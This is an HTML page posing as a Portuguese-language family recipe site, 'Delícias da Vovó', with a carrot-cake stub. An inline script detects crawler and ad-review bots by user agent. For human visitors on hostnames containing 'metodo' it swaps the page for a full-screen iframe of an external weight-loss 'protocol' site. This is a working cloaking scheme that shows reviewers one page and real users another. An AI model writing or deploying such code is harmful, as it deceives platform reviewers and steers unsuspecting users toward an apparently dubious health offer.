<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delícias da Vovó</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        /* Criamos uma margem de segurança de 2% nas laterais */
        .wrapper {
            width: 96%; 
            height: 100%;
            margin: 0 auto; /* Centraliza o site na tela */
            position: relative;
        }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        .safe { padding: 20px; color: white; font-family: sans-serif; }
    </style>
</head>
<body>

<script>
    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
    const isMetodo = window.location.hostname.includes('metodo');

    if (isMetodo && !isBot) {
        document.body.innerHTML = '<div class="wrapper"><iframe src="https://protocoloemagrecimentodivino.lovable.app/"></iframe></div>';
    }
</script>

<div class="safe">
    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
    <p>Receita tradicional da família...</p>
</div>

</body>
</html>
